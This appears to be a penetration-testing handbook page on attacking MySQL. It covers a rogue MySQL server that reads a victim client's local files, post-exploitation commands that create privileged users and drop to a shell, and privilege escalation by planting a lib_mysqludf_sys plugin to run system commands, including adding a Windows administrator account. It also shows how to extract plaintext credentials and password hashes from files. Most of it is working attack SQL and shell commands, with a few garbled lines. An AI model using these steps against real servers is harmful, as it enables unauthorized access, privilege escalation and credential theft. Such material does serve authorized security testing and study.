# Techniques (MySQL)

### [MySQL injection](../80-443-http-s/sql-injection/mysql-injection.md)

### [Reading files](../80-443-http-s/sql-injection/other-payloads.md#reading-files)

### [Writable files](../80-443-http-s/sql-injection/other-payloads.md#writing-files)

### Rogue MySQL server

Actually, when you try to load local data into a table with the content of a file, the MySQL or MariaDB server asks the client to read it and send the content. So, if you can manipulate a mysql client to connect to your own MyQSL server, you can read arbitrary files.

{% tabs %}
{% tab title="Lab Steup" %}
The first thing is to have **MySQL** or **MariaDB** installed. We will show an example of how to do it on Arch Linux (research for other distributions):

```bash
# Install MariaDB (Arch Linux)
sudo pacman -S mariadb
mariadb-install-db --user=mysql --basedir=/usr --datadir=/var/lib/mysql
sudo systemctl start mariadb
```

Then we log into MySQL and create a rogue MySQL server:

```bash
sudo mysql
CREATE USER '<USERNAME>'@'localhost' IDENTIFIED BY '<PASSWORD>';
GRANT ALL PRIVILEGES ON *.* TO '<USERNAME>'@'localhost';
FLUSH PRIVILEGES;
CREATE DATABASE rogueDB;
use rogueDB;
CREATE TABLE content (data TEXT);
quit
```

In addition, we will have to expose the MySQL server remotely so that the victim client can connect to us. To do this, we must modify the bind-address value in the `/etc/my.cnf.d/server.cnf` file (Arch Linux) or `/etc/mysql/mariadb.conf.d/50-server.cnf` (Debian):

{% hint style="danger" %}
By default, MySQL will listen on address **0.0.0.0.0**, which includes all network interfaces.
{% endhint %}

```bash
[mysqld]
bind-address = <INTERFACE_IP> # We can also use 0.0.0.0, which includes all interfaces.
```

Ready, now the next step is to authenticate to our SQL server from the victim client.
{% endtab %}

{% tab title="Read files" %}
After authenticating against our SQL server, from the victim client, we execute the following statements to read files:

```bash
# The word "local" is very important.
load data local infile "/etc/passwd" into table <TABLE CREATE BEFORE> FIELDS TERMINATED BY '\n';
```
{% endtab %}
{% endtabs %}

## Post Exploitation

### With SQL shell

```bash
# Current Level of access:
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='<USERNAME>';
# Access passwords:
select <COLUMN>,<COLUMN> from <TABLE>;
# Create a new user and grant him privileges:
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
# Break into a shell:
\! cat /etc/passwd
\! bash
```

### Privilege Escalation via library

{% hint style="danger" %}
This attack can be done if we are root in MySQL, and if the user that is running this service is another one to which we do not have access. This user can be another normal user and even the `NT AUTHORITY\SYSTEM` in Windows or root in Linux.
{% endhint %}

As the root user in MySQL, we can write to files and load arbitrary plugins. We can use this to create a sys\_exec function that will execute any command as the user under which MySQL is running. But first, we will need to find out what architecture the operating system is on, as well as find out where the plugins are stored:

```sql
> select @@version_compile_os, @@version_compile_machine;
+----------------------+---------------------------+
| @@version_compile_os | @@version_compile_machine |
+----------------------+---------------------------+
| Win64                | x86                       |    # 64 bits
+----------------------+---------------------------+

> select @@plugin_dir;
+-----------------------------------------------------+
| @@plugin_dir                                        |
+-----------------------------------------------------+
| C:\Program Files\MySQL\MySQL Server 5.5\lib\plugin\ | # Path to put the compiled library.
+-----------------------------------------------------
```

You can find the compiled versions of these libraries in sqlmap and/or metasploit:

```bash
# For Linux:
lib_mysqludf_sys_32.so
lib_mysqludf_sys_64.so
# For Windows:
lib_mysqludf_sys_32.dll
lib_mysqludf_sys_64.dll
```

We upload the library to a directory with write permissions such as `/tmp`, we log into MySQL to execute the following statements:

{% tabs %}
{% tab title="Linux" %}
```sql
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/<SO FILE>'));
select * from npn into dumpfile '<PLUGIN PATH>/<SO FILE>';
create function sys_exec returns integer soname '<SO FILE>'; # Creamos la funciÃ³n llamada "sys_exec" que la usaremos para ejecutar comandos.
# Execute commands:
select sys_exec('id > /tmp/out.txt');
```
{% endtab %}

{% tab title="Windows" %}
```sql
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_files('C://temp//<DLL FILE>'));
SELECT * FROM mysql.npn INTO DUMPFILE '<PLUGIN PATH>/<DLL FILE>';
CREATE FUNCTION sys_exec RETURNS integer SONAME '<DLL FILE>';
# Execute commands:
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```
{% endtab %}
{% endtabs %}

### Extracting MySQL credentials from files

Inside `/etc/mysql/debian.cnf` you can find the plaintext password of the user **debian-sys-maint**:

```bash
cat /etc/mysql/debian.cnf
```

You can **use these credentials to log into the mysql database**.

Inside the file `/var/lib/mysql/mysql/user.MYD` you can find **all the MySQL user hashes** (which you can extract from mysql.user inside the database). You can extract them by doing:

```
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

### Enabling logging

You can enable mysql query logging inside `/etc/mysql/my.cnf` by uncommenting the following lines:

![](../../.gitbook/assets/enabling\_logging\_mysql.png)
